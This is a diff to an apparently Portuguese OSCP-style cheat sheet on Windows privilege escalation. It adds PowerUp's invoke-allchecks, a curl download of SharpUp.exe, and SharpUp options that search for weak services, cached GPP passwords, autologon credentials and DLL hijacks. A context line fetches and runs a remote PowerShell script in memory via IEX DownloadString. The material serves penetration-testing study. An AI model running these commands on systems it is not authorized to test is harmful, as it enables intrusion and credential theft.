@@ -861,6 +861,10 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 curl https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1  -Outfile PowerUp.ps1
 import-module .\PowerUp.ps1
 ```
+CHECAR TUDO
+```
+invoke-allchecks
+```
 ACHAR UNQUOTED SERVICE
 ```
 Get-Serviceunquoted -Verbose
@@ -869,6 +873,41 @@ ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENT
 ```
 Get-ModifiableServiceFiles -Verbose
 ```
+##### SHARPUP
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/SharpUp.exe -Outfile SharpUp.exe
+```
+CHECAR TUDO
+```
+.\SharpUp.exe
+.\SharpUp.exe > result.txt
+.\SharpUp.exe audit
+.\SharpUp.exe audit > result.txt
+```
+SHARPUP - EXEMPLOS
+```
+.\ SharpUp.exe ModifiableServiceBinaries
+.\SharpUp.exe audit ModifiableServiceBinaries
+```
+SHARPUP - OPÇÕES
+```
+.\SharpUp.exe AlwaysInstallElevated
+.\SharpUp.exe CachedGPPPassword
+.\SharpUp.exe DomainGPPPassword
+.\SharpUp.exe HijackablePaths
+.\SharpUp.exe McAfeeSitelistFiles
+.\SharpUp.exe ModifiableScheduledTask
+.\SharpUp.exe ModifiableServiceBinaries
+.\SharpUp.exe ModifiableServiceRegistryKeys
+.\SharpUp.exe ModifiableServices
+.\SharpUp.exe ProcessDLLHijack
+.\SharpUp.exe RegistryAutoLogons
+.\SharpUp.exe RegistryAutoruns
+.\SharpUp.exe TokenPrivileges
+.\SharpUp.exe UnattendedInstallFiles
+.\SharpUp.exe UnquotedServicePath
+```
+
 
 ## TECHNIQUES
 ##### ALWAYS ELEVATED(1)
